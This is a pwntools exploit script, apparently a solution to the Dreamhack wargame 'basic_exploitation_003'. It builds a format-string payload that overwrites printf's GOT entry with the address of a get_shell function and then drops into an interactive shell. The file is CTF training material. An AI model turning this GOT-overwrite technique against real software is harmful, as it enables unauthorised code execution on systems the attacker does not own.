from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

# p = remote("host1.dreamhack.games", 11011)
p = process("./basic_exploitation_003")
e = ELF("./basic_exploitation_003")
gdb.attach(p)

get_shell = e.symbols['get_shell']
printf_got = e.got['printf']

#[+] get_shell: 0x8048669
#[+] printf_got: 0x804a010
slog("get_shell", get_shell)
slog("printf_got",printf_got)

#[+] get_shell: 0x08048669
# $3   $2   $1   $0
#0x08 0x04 0x86 0x69
payload = p32(printf_got+2)
payload += p32(printf_got+1)
payload += p32(printf_got+0)

# #0x69 == 105 - 12 = 93
payload += b"%93c%3$hhn"

# #0x86 == 134 - 105 == 29
payload += b"%29c%2$hhn"

# #0x804 == 2052 - 134 => 1918
payload += b"%1918c%1$hn"

p.send(payload)
# p.recv()
p.interactive()